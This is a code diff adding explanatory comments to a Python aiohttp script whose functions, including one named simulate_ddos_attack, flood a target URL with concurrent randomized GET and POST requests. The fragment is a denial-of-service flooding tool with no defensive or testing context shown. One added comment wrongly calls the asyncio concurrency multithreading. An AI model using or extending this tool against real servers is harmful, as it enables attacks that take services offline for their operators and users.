@@ -2,7 +2,7 @@ import time
 import random
 import logging
 import asyncio
-import aiohttp
+import aiohttp # send async requests for non blocking IO operations
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(message)s')
@@ -10,7 +10,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(mess
 async def send_async_requests(session, target_url, num_requests):
     for _ in range(num_requests):
         try:
-            method = random.choice(["GET", "POST"])
+            method = random.choice(["GET", "POST"]) # randomize request methods
             if method == "GET":
                 async with session.get(target_url) as response:
                     await response.text()
@@ -21,7 +21,7 @@ async def send_async_requests(session, target_url, num_requests):
         except Exception as e:
             logging.error(f"Request failed: {e}")
 
-async def simulate_ddos_attack(target_url, total_requests, num_threads):
+async def simulate_ddos_attack(target_url, total_requests, num_threads): # multithreading to send requests concurrently
     requests_per_thread = total_requests // num_threads
     tasks = []
     async with aiohttp.ClientSession() as session:
